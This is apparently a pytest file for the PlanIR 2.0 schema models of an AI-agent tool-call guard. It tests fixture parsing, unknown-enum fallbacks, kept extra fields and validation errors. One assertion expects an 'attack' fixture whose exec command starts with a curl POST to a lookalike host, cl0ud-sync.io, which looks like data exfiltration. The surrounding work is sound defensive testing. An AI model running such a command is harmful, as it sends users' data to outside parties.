"""PlanIR 2.0 models: the worked examples parse, unknown enum values are tolerated, unknown fields kept."""

from __future__ import annotations

import copy

import pytest
from pydantic import ValidationError

from sentrook.planir.models import (
    Decision,
    GrantScope,
    InputKind,
    PlanIR,
    SenderBasis,
    SenderRelation,
    ToolKind,
)


def test_worked_examples_parse(attack_case, twin_case):
    attack = PlanIR.model_validate(attack_case["fixture"])
    twin = PlanIR.model_validate(twin_case["fixture"])

    assert attack.pending_call.tool_kind is ToolKind.EXEC
    assert attack.pending_call.arguments["command"].startswith("curl -X POST https://cl0ud-sync.io")
    assert attack.history[0].decision is Decision.ALLOWED
    assert attack.new_inputs[0].kind is InputKind.TOOL_RESULT
    assert attack.session.state is None and attack.session.step == 2
    assert attack.trigger.sender.relation is SenderRelation.OWNER
    assert attack.trigger.sender.basis == [SenderBasis.HOST_OWNER_FLAG]

    assert twin.grants[0].kind == "destination" and twin.grants[0].scope is GrantScope.PERSISTENT
    assert twin.grants[0].pattern == "*.mycorp.com"


def test_round_trip_keeps_every_input_key(attack_case):
    planir = PlanIR.model_validate(attack_case["fixture"])
    dumped = planir.model_dump(mode="json")

    def keys(obj, prefix=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                yield from keys(v, f"{prefix}{k}.")
        elif isinstance(obj, list):
            for i, v in enumerate(obj):
                yield from keys(v, f"{prefix}{i}.")
        else:
            yield prefix.rstrip(".")

    assert set(keys(attack_case["fixture"])) <= set(keys(dumped))


def test_unknown_enum_values_fall_back(attack_case):
    data = copy.deepcopy(attack_case["fixture"])
    data["pending_call"]["tool_kind"] = "teleport"
    data["trigger"]["sender"]["relation"] = "cousin"
    data["trigger"]["sender"]["basis"] = ["crystal_ball"]
    data["history"][0]["decision"] = "shrugged"
    data["new_inputs"][0]["kind"] = "carrier_pigeon"
    data["grants"] = [
        {"grant_ref": "g1", "kind": "destination", "pattern": "x.example", "scope": "forever"}
    ]

    planir = PlanIR.model_validate(data)
    assert planir.pending_call.tool_kind is ToolKind.OTHER
    assert planir.trigger.sender.relation is SenderRelation.UNKNOWN
    assert planir.trigger.sender.basis == [SenderBasis.UNKNOWN]
    assert planir.history[0].decision is Decision.UNKNOWN
    assert planir.new_inputs[0].kind is InputKind.OTHER
    assert planir.grants[0].scope is GrantScope.SESSION  # unknown scope reads as the weaker one


def test_enum_values_are_case_insensitive():
    assert ToolKind("EXEC") is ToolKind.EXEC
    assert SenderRelation(" Owner ") is SenderRelation.OWNER


def test_unknown_fields_are_kept(attack_case):
    data = copy.deepcopy(attack_case["fixture"])
    data["pending_call"]["novel_field"] = {"a": 1}
    data["host"]["policy"]["sandboxed"] = True
    planir = PlanIR.model_validate(data)
    assert planir.pending_call.model_extra == {"novel_field": {"a": 1}}
    assert planir.host.policy.model_extra == {"sandboxed": True}
    assert planir.model_dump(mode="json")["pending_call"]["novel_field"] == {"a": 1}


@pytest.mark.parametrize(
    "path, value",
    [
        (("planir_version",), "1.0"),
        (("session", "step"), 0),
        (("request_id",), ""),
        (("history", 0, "risk"), 250),
    ],
)
def test_structural_errors_are_rejected(attack_case, path, value):
    data = copy.deepcopy(attack_case["fixture"])
    target = data
    for key in path[:-1]:
        target = target[key]
    target[path[-1]] = value
    with pytest.raises(ValidationError):
        PlanIR.model_validate(data)


def test_defaults_for_optional_blocks():
    minimal = {
        "planir_version": "2.0",
        "request_id": "r1",
        "run_ref": "run1",
        "sent_at": "2026-10-16T09:00:00Z",
        "host": {"platform": "openclaw", "workspace_root": "~/w", "home": "/home/me"},
        "session": {"session_ref": "s1", "turn": 1, "step": 1},
        "request": {"text": "hello"},
        "pending_call": {
            "call_id": "c1",
            "tool": "read",
            "tool_kind": "file_read",
            "arguments": {"path": "x"},
        },
    }
    planir = PlanIR.model_validate(minimal)
    assert planir.options.packs == ["tier1"]
    assert planir.trigger.sender.relation is SenderRelation.UNKNOWN
    assert planir.history == [] and planir.new_inputs == [] and planir.grants == []
